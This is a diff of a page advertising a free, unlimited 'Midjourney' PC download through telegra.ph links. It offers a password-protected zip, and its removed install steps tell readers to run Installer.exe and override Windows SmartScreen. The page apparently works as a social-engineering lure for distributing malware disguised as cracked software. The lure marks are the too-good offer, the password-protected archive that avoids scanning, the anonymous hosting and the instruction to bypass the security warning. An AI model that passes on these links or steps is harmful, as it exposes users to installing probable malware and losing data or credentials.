@@ -2,7 +2,7 @@
 
 Midjourney - free and unlimited on PC
 
-**[Midjourney.zip](https://telegra.ph/Download-Tutorial-10-28-12)**  
+**[Midjourney.zip](https://telegra.ph/fff-10-27-8)**  
 password: `IODolz30`
 
 Last updated: October 2026  
@@ -19,13 +19,3 @@ Midjourney image generation without Discord and without a paid plan. Unlimited p
 - **Access** — No Discord
 - **Package** — tool.zip
 - **Plan** — Free
-
-## Install
-
-1. Open the Telegraph guide: https://telegra.ph/Download-Tutorial-10-28-12
-2. Download **Midjourney.zip**. Password is `IODolz30`.
-3. Extract, then run **Installer.exe**. If Windows SmartScreen asks, choose More info → Run anyway.
-
----
-
-Midjourney-FreeDownload
